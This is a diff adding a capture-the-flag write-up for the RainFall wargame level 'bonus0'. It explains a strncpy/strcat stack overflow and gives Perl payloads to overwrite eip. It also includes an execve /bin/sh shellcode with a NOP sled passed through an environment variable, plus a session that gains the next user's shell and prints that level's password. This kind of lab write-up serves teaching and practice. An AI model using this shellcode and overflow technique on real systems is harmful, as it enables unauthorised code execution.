@@ -1,0 +1,29 @@
+After reversing bonus0 binary we see there is a vulnerability in pp() because of p()
+strchr in p() will put a null char at the first '\n' it will find, but if our '\n'
+is after the 20th char strncpy won't put a '\n' in dest
+
+Then when strcpy() in pp() will try to copy buf_a it will copy buf_a + buf_b as buf_b is null terminated.
+After that strcat() will overflow the buffer of size 42 from the main and allow us to overwrite eip
+
+shell perl -e 'print "A"x95 . "\n" . "A"x4000 . "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3" . "\n"' > /tmp/file
+in gdb show us that the offset for the overflow is 9. We will need to write 9 bytes in buf_b and then put
+the address where we want to redirect to program.
+
+I choosed to put my shellcode in the environmnet variables with a lot of NOP instructions before, so that
+I just need to redirect to a random address in the nop to get my shellcode executed
+
+I run gdb with env -i and enter the command 'x/10s *((char **)environ)' to get my shellcode address
+
+perl -e 'print "A"x95 . "\n" . "A"x4000 . "A"x9 . "\x7f\xfe\xff\xbf" . "A"x7 . "\n"' > /tmp/file
+
+Then I juste need to put the address of my shellcode and write 7 bytes + '\n' to complete the overflow in a file
+Then we juste need to run bonus0 with our shellcode and the exploit file
+
+bonus0@RainFall:~$ cat /tmp/file - | env -i SHELLCODE=`perl -e 'print "\x90"x500 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"'` ./bonus0
+ -
+ -
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAA���ABCDEFG�� AAAAAAAAA���ABCDEFG��
+whoami
+bonus1
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
